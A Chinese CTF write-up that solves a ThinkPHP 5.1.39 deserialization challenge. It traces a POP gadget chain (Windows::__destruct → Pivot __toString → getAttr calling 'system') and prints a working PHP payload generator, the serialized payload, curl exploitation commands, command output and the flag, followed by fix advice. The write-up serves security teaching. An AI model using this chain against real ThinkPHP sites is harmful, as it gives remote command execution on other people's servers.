---
title: "N1BOOK - 4-ThinkPHP反序列化利用链"
date: 2026-09-17
categories:
  - CTF
  - WEB
tags:
  - CTF
  - ThinkPHP
  - 反序列化
  - POP链
  - RCE
  - PHP魔术方法
---

# 1. 题目分析

**题目地址**：`http://0459bdc1e987465c72023598.http-ctf2.dasctf.com/`

**题目类型**：PHP 反序列化 / ThinkPHP 5.1 POP 链挖掘 → RCE

**初始访问**：

```bash
curl -s -i "http://0459bdc1e987465c72023598.http-ctf2.dasctf.com/"
```

```
HTTP/1.1 200 OK
Server: openresty
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
X-Powered-By: PHP/7.3.18
Cache-Control: no-cache

<a href='www.zip'>download code</a>
```

## 关键信息提取

| 线索 | 说明 |
|------|------|
| `Server: openresty` | 前端是 Nginx 系（OpenResty）反向代理 |
| `X-Powered-By: PHP/7.3.18` | 后端 PHP **7.3**（弱类型内部函数行为，后面关键） |
| 页面 `www.zip` | **源码直接给了**，审计优先 |
| 题目名「ThinkPHP反序列化利用链」 | 出题人已点明是框架自带的 POP gadget 链利用，而非业务代码漏洞 |

下载源码并解压：

```bash
curl -s -O "http://0459bdc1e987465c72023598.http-ctf2.dasctf.com/www.zip"
unzip -o www.zip -d /Users/zhaochoudemao/Documents/CTF/1-CTFshow/tmp/www
```

源码结构（ThinkPHP 5.1 单应用模式）：

```
www/
├── application/                    ← 应用代码
│   └── index/controller/Index.php
├── config/app.php                  ← 框架配置（var_pathinfo = 's'）
├── public/index.php                ← 入口文件
├── route/route.php
├── thinkphp/library/               ← 框架代码（gadget 都在这里）
└── vendor/
```

框架版本确认：

```bash
grep -rn "const VERSION" thinkphp/library/think/App.php
# thinkphp/library/think/App.php:23:    const VERSION = '5.1.39 LTS';
```

（后来访问错误路由时页面底部也直接渲染出 `ThinkPHP V5.1.39 LTS`，双重确认。）

业务代码全部逻辑只有两个方法：

```php
// application/index/controller/Index.php（全文）
namespace app\index\controller;

class Index
{
    public function index()
    {
        return "<a href='www.zip'>download code</a>";
    }

    public function hello()
    {
        unserialize($_POST['str']);     // ← 危险入口：用户输入直接进 unserialize
    }
}
```

**推理**：入口没有任何过滤、没有 `allowed_classes` 限制，且框架是出过大量反序列化 gadget 的 ThinkPHP 5.1 → 目标明确：**从框架源码里挖一条 POP 链**，完成 RCE 拿 `/FLAG`。

# 2. 信息收集

## 2.1 路由探测（找 `hello()` 的可达 URL）

直接按 TP 默认规则访问并不通，踩了几个坑：

```bash
TARGET="http://0459bdc1e987465c72023598.http-ctf2.dasctf.com"

# ① 默认 pathinfo 形式
curl -s -X POST "$TARGET/index.php/index/index/hello" -d 'str=O:8:"stdClass":0:{}'
# → <a href='www.zip'>download code</a>   （跑的是 index()，路由没进去）

# ② 少一层的写法
curl -s "$TARGET/index.php/index/hello"
# → <a href='www.zip'>download code</a>

# ③ 路由规则 hello/:name 是 GET 专用，试一下
curl -s -X POST "$TARGET/index.php/hello/test" -d 'str=O:8:"stdClass":0:{}'
# → <a href='www.zip'>download code</a>

# ④ 用 TP 的显式 pathinfo 参数 s（config/app.php: 'var_pathinfo' => 's'）
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
  -X POST -d 'str=O:8:"stdClass":0:{}' "$TARGET/index.php?s=index/index/hello"
# → 200 0     ← hello() 执行了！返回 0 字节（unserialize 无回显）
```

**为什么 `?s=` 才行**：OpenResty 配置只把请求转发给 `index.php`，没有透传 PATH_INFO，所以 TP 解析不到路径信息，一律落到默认路由 `index/index/index`；而 `s` 参数是 TP 显式的 pathinfo 来源，能强制指定模块/控制器/方法。

## 2.2 基线行为（证明代码路径可达）

```bash
# 合法序列化对象但没有魔术方法 → 空响应（无任何副作用）
curl -s -X POST "$TARGET/index.php?s=index/index/hello" -d 'str=O:8:"stdClass":0:{}'
# （0 字节）

# 非法序列化数据 → ThinkPHP 异常页（app_debug=false 只显示 "页面错误！请稍后再试～"）
curl -s -X POST "$TARGET/index.php?s=index/index/hello" -d 'str=abc' | grep -o '<h1>[^<]*'
# <h1>页面错误！请稍后再试～
```

**结论**：`hello()` 可稳定触发，且 `unserialize` 抛错会被框架异常处理器兜住——`str` 参数就是攻击面。

## 2.3 本地环境

- 本地 PHP 只有 **8.5.1**（Homebrew），与目标的 7.3.18 有版本差异；
- 本地没有 phpggc（`which phpggc` 无结果），POP 链只能**从源码手工挖**；
- 提取的源码目录：`/Users/zhaochoudemao/Documents/CTF/1-CTFshow/tmp/www`

# 3. 漏洞分析（含推理链和失败路径）

## 3.1 推理链总览

```
线索：unserialize($_POST['str']) + ThinkPHP 5.1.39
   ↓
假设 1：业务代码里藏有自定义 gadget（没有，Index.php 全文只有两个方法）
   ↓ 排除业务层
假设 2：用框架自带魔术方法拼 POP 链
   ↓
枚举魔术方法：grep -rn "function __destruct\|__toString\|__wakeup" thinkphp/library/
   ↓ 候选 __destruct：Connection、Unix、Windows、Process
   ↓ 候选 __toString：Paginator、Conversion(Model)、Expression、Collection、console\Input
   ↓
选定链头：Windows::__destruct → removeFiles() → file_exists($filename)
          （file_exists 接受对象 → 触发 __toString，是经典链头）
   ↓
链中：__toString 落在 think\model\Pivot 上（Conversion trait）
      __toString → toJson → toArray → getAttr
   ↓
链尾：Attribute::getAttr 里 withAttr 数组被当闭包调用
      $closure = $this->withAttr[$fieldName]; $value = $closure($value, $this->data);
      → 把 withAttr 设成 'system'、data 设成命令 → 任意命令执行
```

## 3.2 链头：`think\process\pipes\Windows::__destruct`

`thinkphp/library/think/process/pipes/Windows.php`：

```php
// 第 56 行
public function __destruct()
{
    $this->close();          // pipes 默认 [] → 无副作用
    $this->removeFiles();
}

// 第 160 行
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {    // ← $filename 是对象时，被当字符串使用
            @unlink($filename);          //    触发该对象的 __toString()
        }
    }
    $this->files = [];
}
```

**关键点**：`file_exists()` 需要 string 参数，传入对象时 PHP 会调用其 `__toString()` 尝试转换。`$files` 是 private 属性，完全由反序列化数据控制。

## 3.3 链中：`think\model\Pivot::__toString` → `toArray` → `getAttr`

Model 通过 `Conversion` trait 获得 `__toString`，`thinkphp/library/think/model/concern/Conversion.php`：

```php
// 第 242 行
public function __toString()
{
    return $this->toJson();
}

// 第 226 行
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}

// 第 131 行
public function toArray()
{
    ...
    // 第 162 行：合并 data 和 relation
    $data = array_merge($this->data, $this->relation);

    foreach ($data as $key => $val) {
        if ($val instanceof Model || $val instanceof ModelCollection) {
            ...
        } elseif (isset($this->visible[$key])) {
            $item[$key] = $this->getAttr($key);       // 第 177 行
        } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
            $item[$key] = $this->getAttr($key);       // 第 179 行 ← 进入 getAttr()
        }
    }
    ...
}
```

只要 `$this->data` 里有一个键值对（`visible`、`hidden` 保持默认空数组），就会走进 `getAttr($key)`。

`thinkphp/library/think/model/concern/Attribute.php`：

```php
// 第 472 行
public function getAttr($name, &$item = null)
{
    try {
        $notFound = false;
        $value    = $this->getData($name);       // 从 $this->data 取值（返回我们的命令字符串）
    } catch (InvalidArgumentException $e) { ... }

    $fieldName = Loader::parseName($name);
    $method    = 'get' . Loader::parseName($name, 1) . 'Attr';

    if (isset($this->withAttr[$fieldName])) {    // 第 486 行 ← 命中！
        ...
        $closure = $this->withAttr[$fieldName];  // 第 492 行 ← 本应是闭包，可塞字符串函数名
        $value   = $closure($value, $this->data); // 第 493 行 ← 任意函数调用！
    } elseif (method_exists($this, $method)) { ... }
    ...
    return $value;
}
```

**链尾原理**：`withAttr` 本意是存放「属性获取器闭包」，但 PHP 里 `$closure(...)` 对**字符串**同样有效——`$closure = 'system'` 就等于调用 `system($value, $this->data)`。第一个参数是可控命令，第二个参数是 `$this->data` 数组（PHP 7.3 内部函数弱类型检查允许，见 3.5）。

## 3.4 触发时机与无害环节

| 环节 | 行为 | 影响 |
|------|------|------|
| `unserialize()` 返回值未赋值 | 临时对象引用计数立即归零 | `Windows::__destruct` **在请求内立即执行**，`system()` 输出进入响应体 |
| 反序列化 Pivot 时触发 `Model::__wakeup()`（Model.php:1005） | `initialize()` → `static::init()`（空方法） | 无害，不干扰链 |
| `Windows::close()` | `$this->pipes` 为空数组 | 无害，直接进入 `removeFiles()` |
| `toArray()` 里的 `json_encode` | system 输出已直接打印到 stdout | 返回的末行被 json 编码，无关紧要 |

## 3.5 payload 构造的两个坑（技术难点）

### 坑 1：私有属性/trait 属性的序列化名（mangled name）

`$data`、`$withAttr` 定义在 `Attribute` trait 里且是 **private**，trait 被 `think\Model` 使用 → 序列化后属性名为 `\0think\Model\0data`、`\0think\Model\0withAttr`（**按使用 trait 的类名 mangling，不是 trait 名**）。

本地用等价结构验证：

```php
trait Attribute { private $data = []; }
abstract class Model { use Attribute; }
class Pivot extends Model {}
echo serialize(new Pivot());
// O:5:"Pivot":1:{s:11:" Model data";a:0:{}}       ← \0Model\0data
```

如果手写 payload 时把 mangling 写错（比如写成 `\0think\model\Pivot\0data`），反序列化出来就是两个**动态公有属性**，`getAttr` 内的 `$this->withAttr` 根本取不到值，链子直接断。

### 坑 2：`system($cmd, $array)` 在 PHP 7.3 与 PHP 8 的行为差异

链尾调用是 `$closure($value, $this->data)`，第二个参数固定是数组，而 `system(string $command, int &$result_code)` 第二个参数期望 int：

- **PHP 7.3（目标）**：内部函数由 C 层 `zpp` 解析，第二参规格是 `z`（任意 zval）→ 先执行命令，再把退出码覆盖写进数组变量，**命令正常执行**（实测回显 `uid=82(www-data)`）；
- **PHP 8.0+（本地）**：内部函数 arginfo 带上了真实类型约束 → 抛 `TypeError`，命令**不会**执行。

这正是本地 PHP 8.5 不能直接跑通、但目标 PHP 7.3.18 能打通的原因，也说明「看 HTTP 头里的 `X-Powered-By` 判断 PHP 版本」在反序列化题里的重要性。

## 3.6 完整 gadget 链（ASCII 图）

```
unserialize($_POST['str'])
        │
        ▼
┌──────────────────────────────────────────────────────────────┐
│ think\process\pipes\Windows                                  │
│   private $files = [ 一个 Pivot 对象 ]                        │
│                                                              │
│ __destruct()                                                 │
│   ├─► close()            （pipes/[]、fileHandles/[] 无副作用）│
│   └─► removeFiles()                                          │
│         foreach ($this->files as $filename)                  │
│             file_exists($filename)   ◄── 对象当字符串用        │
└─────────────────────────────┬────────────────────────────────┘
                              │ 触发 __toString()
                              ▼
┌──────────────────────────────────────────────────────────────┐
│ think\model\Pivot extends think\Model                        │
│  （Conversion trait）                                         │
│   __toString() → toJson() → toArray()                        │
│        │                                                     │
│        │  array_merge($this->data, $this->relation)          │
│        ▼                                                     │
│   getAttr('cmd')  （Attribute trait）                         │
│        │                                                     │
│        │  isset($this->withAttr['cmd']) === true             │
│        ▼                                                     │
│   $closure = $this->withAttr['cmd'];   // 字符串 'system'     │
│   $value   = $closure($value, $this->data);                  │
│                 │  $value = data['cmd'] = 命令               │
└─────────────────┼────────────────────────────────────────────┘
                  ▼
        system('cat /FLAG', [...])  →  RCE，输出直达响应体
```

## 3.7 尝试过但失败的路径（排除法记录）

| 尝试 | 预期 | 实际结果 | 排除/结论 |
|------|------|---------|-----------|
| `POST /index.php/index/index/hello` | 触发 `hello()` | 返回 index 页 | OpenResty 未透传 PATH_INFO，路由落到 `index()` |
| `POST /index.php/index/hello` | 触发 `hello()` | 返回 index 页 | 同上 |
| `POST /index.php/hello/test` | 走 `hello/:name` 路由 | 返回 index 页 | 该路由是 GET 专用且 pathinfo 不通 |
| `str=O:8:"stdClass":0:{}` | 验证入口 | 200，0 字节 | 入口通，但 stdClass 无魔术方法可用 |
| `str=abc` | 观察报错 | TP「页面错误」异常页 | 入口通，异常被框架捕获 |
| 找业务自定义 gadget | 快速出链 | `Index.php` 只有两个方法 | 排除业务层，转向框架层 |
| 本地直接 include 框架源码序列化 | 省去手拼 | 本地 PHP 8.5 与 TP 5.1 代码存在兼容问题 | 改用 stub 类重构序列化结构 |
| 本地 phpggc 生成 | 现成链 | 未安装 | 手工从源码挖链 |
| 本地 PHP 8.5 跑链验证 | 看 RCE | `system()` 第二参数 TypeError | 确认是 PHP 版本差异，目标 7.3 可用 |

# 4. 漏洞利用

## 4.1 Payload 生成脚本

用 stub 类复刻真实框架的「命名空间 + 类名 + 属性可见性」，序列化出的字符串与真实环境完全等价（stub 里额外加的构造方法不影响序列化输出）：

```php
<?php
// gen_tp51_payload.php —— ThinkPHP 5.1.39 POP 链生成器
// 用法: php gen_tp51_payload.php 'cat /FLAG' > payload.txt

namespace think {
    // 真实框架中 $data/$withAttr 是 Attribute trait 的 private 属性，
    // trait 被 think\Model 使用 → 序列化名 \0think\Model\0data
    abstract class Model
    {
        private $data = [];
        private $withAttr = [];
        protected $relation = [];

        public function __construct($data = [], $withAttr = [])
        {
            $this->data     = $data;
            $this->withAttr = $withAttr;
        }
    }
}

namespace think\model {
    class Pivot extends \think\Model
    {
        public $parent = null;
        protected $autoWriteTimestamp = false;
    }
}

namespace think\process\pipes {
    abstract class Pipes
    {
        public $pipes = [];
    }

    class Windows extends Pipes
    {
        private $files = [];
        private $fileHandles = [];
        private $readBytes = [1 => 0, 2 => 0];

        public function __construct($obj)
        {
            $this->files = [$obj];
        }
    }
}

namespace {
    $cmd = isset($argv[1]) ? $argv[1] : 'id';

    $pivot = new \think\model\Pivot(
        ['cmd' => $cmd],          // data['cmd']       = 要执行的命令
        ['cmd' => 'system']       // withAttr['cmd']   = 调用的函数
    );

    $windows = new \think\process\pipes\Windows($pivot);

    echo 'str=' . urlencode(serialize($windows));
}
```

生成后的原始序列化结构（url 解码后，`\0` 显示为空格）：

```
O:27:"think\process\pipes\Windows":4:{
  s:5:"pipes";a:0:{}
  s:34:"\0think\process\pipes\Windows\0files";a:1:{
    i:0;O:17:"think\model\Pivot":5:{
      s:17:"\0think\Model\0data";a:1:{s:3:"cmd";s:8:"cat /FLAG";}
      s:21:"\0think\Model\0withAttr";a:1:{s:3:"cmd";s:6:"system";}
      s:11:"\0*\0relation";a:0:{}
      s:6:"parent";N;
      s:21:"\0*\0autoWriteTimestamp";b:0;
    }
  }
  s:40:"\0think\process\pipes\Windows\0fileHandles";a:0:{}
  s:38:"\0think\process\pipes\Windows\0readBytes";a:2:{i:1;i:0;i:2;i:0;}
}
```

## 4.2 验证最小 PoC：执行 `id`

```bash
php gen_tp51_payload.php 'id' > /tmp/payload_id.txt

curl -s -i -X POST "http://0459bdc1e987465c72023598.http-ctf2.dasctf.com/index.php?s=index/index/hello" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data @/tmp/payload_id.txt
```

```
HTTP/1.1 200 OK
Server: openresty
X-Powered-By: PHP/7.3.18

uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

**RCE 确认**。

## 4.3 定位 flag

```bash
run() { php gen_tp51_payload.php "$1" > /tmp/payload.txt
        curl -s -X POST "http://.../index.php?s=index/index/hello" \
             -H 'Content-Type: application/x-www-form-urlencoded' --data @/tmp/payload.txt; }

run 'ls -la /'
# -rw-r--r--    1 root     root           40 Mar 11  2020 FLAG     ← 根目录直接有 FLAG

run 'find / -maxdepth 4 -iname "*flag*" 2>/dev/null | head'
# /FLAG
```

## 4.4 读取 Flag

```bash
php gen_tp51_payload.php 'cat /FLAG' > /tmp/payload.txt

curl -s -X POST "http://0459bdc1e987465c72023598.http-ctf2.dasctf.com/index.php?s=index/index/hello" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data @/tmp/payload.txt
```

```
n1book{de70641304640057390e8fabc8b515bf}
```

# 5. Flag

```
n1book{de70641304640057390e8fabc8b515bf}
```

获取方式：构造 `Windows → Pivot(withAttr=system, data=cmd)` 的序列化 payload，POST 到 `index.php?s=index/index/hello` 的 `str` 参数，触发 `Windows::__destruct → file_exists → __toString → toArray → getAttr → system()` 链，命令执行读取 `/FLAG`。

# 6. 知识点总结

## 6.1 漏洞成因

```php
// 应用层
unserialize($_POST['str']);         // 无条件反序列化用户输入
```

- 应用层把**完全可控的数据**送进 `unserialize()`，且未限制 `allowed_classes`；
- 框架内存在大量可作为 gadget 的魔术方法组合（`__destruct` + `__toString` + 属性获取器），两者叠加 = 反序列化 RCE。

**注意**：这**不是**「框架的 CVE」，而是「框架提供了 POP 链的零件，业务层错误地反序列化了不可信数据」。无论 ThinkPHP 升到多新，只要业务这样写，链子总能被挖出来。

## 6.2 常用魔术方法触发条件

| 魔术方法 | 何时触发 | 本次链中的作用 |
|----------|---------|---------------|
| `__destruct` | 对象引用计数归零（请求结束/临时变量释放） | **链头**：`unserialize` 返回值未赋值，立即析构 |
| `__toString` | 对象被当字符串使用（`file_exists`、字符串拼接、`echo` 等） | **链环**：`file_exists($obj)` 触发 Model 的 `__toString` |
| `__wakeup` | 反序列化完成时 | 被 Model 实现为 `initialize()`，无害 |
| `__call` | 调用不存在的方法 | 本链未用（TP 5.0 链会用） |
| `__invoke` | 对象当函数调用 | 本链用字符串函数名代替，无需构造 |

## 6.3 PHP 序列化属性名 mangling 规则（构链必备）

| 属性声明 | 序列化中的名字 | 例子 |
|----------|---------------|------|
| `public $a` | `a` | `s:1:"a"` |
| `protected $a` | `\0*\0a` | `s:4:"\0*\0a"` |
| `private $a` | `\0类名\0a` | `\0think\Model\0data` |
| **trait 中的 private 属性** | `\0使用trait的类名\0a` | `\0think\Model\0data`（**不是 trait 名**） |

**实战提醒**：无法本地复现真实类环境时，用 stub 类**保持命名空间/类名/可见性完全一致**，序列化结构才会正确。手拼字符串时一个 `\0` 或类名写错，链子必断。

## 6.4 ThinkPHP 5.1 路由小抄

- `config/app.php` 中 `'var_pathinfo' => 's'`：PATH_INFO 不可用时，可用 `?s=模块/控制器/方法` 显式路由；
- OpenResty/Nginx 未透传 PATH_INFO 时，`/index.php/a/b/c` 会落到默认 `index/index/index`，需要用 `?s=`；
- 本次入口：`POST /index.php?s=index/index/hello`，参数 `str`。

## 6.5 PHP 版本差异对利用的影响

| 行为 | PHP 7.3（目标） | PHP 8.0+ |
|------|----------------|----------|
| 内部函数传参类型不符 | 弱类型 zpp，多数情况警告/忽略，命令仍执行 | arginfo 强约束，直接 `TypeError` |
| `system('cmd', [])` | 第二参是任意 zval，命令执行 | 第二参要求 `int`，异常不执行 |
| 动态属性 | 允许 | 8.2+ 弃用警告 |

判断目标版本：响应头 `X-Powered-By`（本题 `PHP/7.3.18`）或报错页版本信息。

## 6.6 修复建议

```php
// ❌ 危险：不可信数据直接反序列化
unserialize($_POST['str']);

// ✅ 方案 1：改用 JSON（首选）
$data = json_decode($_POST['str'], true);

// ✅ 方案 2：必须用序列化时，白名单类 + 签名校验
$data = unserialize($_POST['str'], ['allowed_classes' => [SafeClass::class]]);

// ✅ 方案 3：加密/签名后再传输（确保数据未篡改）
$raw = decrypt($_POST['str']);
$data = unserialize($raw);
```

其他加固：

- `php.ini` 关闭不必要函数（`disable_functions`）只能提高成本，链尾可换 `call_user_func`/`file_put_contents` 等替代；
- WAF 拦截请求体中的 `O:\d+:"` 序列化特征（绕过手段多，仅作纵深防御）；
- 根本原则：**永远不要反序列化不可信数据**。

## 6.7 与系列中其它题目的对比

| 题目 | 漏洞本质 | 入口 | 利用终点 |
|------|---------|------|---------|
| 1-SSTI | 模板引擎执行用户输入 | GET `password` | Jinja2 注入 RCE |
| 3-逻辑漏洞 | 业务状态信任客户端参数 | `cost`/`goods` | 余额篡改买 FLAG |
| **4-ThinkPHP反序列化** | **unserialize 不可信数据 + 框架 POP 链** | **POST `str`** | **反序列化 RCE 读 /FLAG** |

共同点：漏洞都发生在**服务端对客户端数据的信任边界**上；区别是本题利用的是「语言/框架级 gadget 零件」，需要深入源码审计而非仅黑盒探测。

# 7. 解题链路总结图

```
访问首页 → www.zip 下载源码
    ↓
审计 Index.php → hello() 存在 unserialize($_POST['str'])
    ↓
路由探测（pathinfo 不通）→ 用 ?s=index/index/hello 打通入口
    ↓
stdClass / str=abc 基线测试 → 确认入口执行、异常被兜住
    ↓
grep 框架魔术方法
    ↓ __destruct 候选：Windows / Process / Connection / Unix
选定 Windows::__destruct → removeFiles → file_exists($obj)
    ↓ 需要 __toString
Conversion trait: Model::__toString → toJson → toArray → getAttr
    ↓ getAttr 中 withAttr 命中 → $closure(...) 任意函数调用
构造链：Windows->files=[Pivot(data=[cmd=>命令], withAttr=[cmd=>system])]
    ↓
stub 类复刻命名空间/可见性 → serialize → urlencode
    ↓ 注意 trait private 属性 mangling：\0think\Model\0data
POST str=... → system('id') → uid=82(www-data) ✅
    ↓
ls -la / → 发现 /FLAG（root 只读权限 644，www-data 可读）
    ↓
system('cat /FLAG')
    ↓
n1book{de70641304640057390e8fabc8b515bf}
    ↓ 溯源根因：业务层无条件 unserialize 用户输入 + 框架 gadget 链可用
```
